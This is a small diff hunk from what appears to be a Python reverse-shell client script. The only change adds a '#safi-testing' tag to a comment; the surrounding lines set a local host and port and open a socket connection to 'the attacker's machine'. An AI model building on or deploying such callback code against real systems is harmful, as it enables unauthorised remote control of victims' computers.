@@ -6,7 +6,7 @@ SERVER_HOST = "127.0.0.1"
 SERVER_PORT = 5003
 SERVER_SIZE = 1024
 
-# create a socket object
+# create a socket object #safi-testing
 s = socket.socket()
 # connect to the attacker's machine
 s.connect((SERVER_HOST, SERVER_PORT))
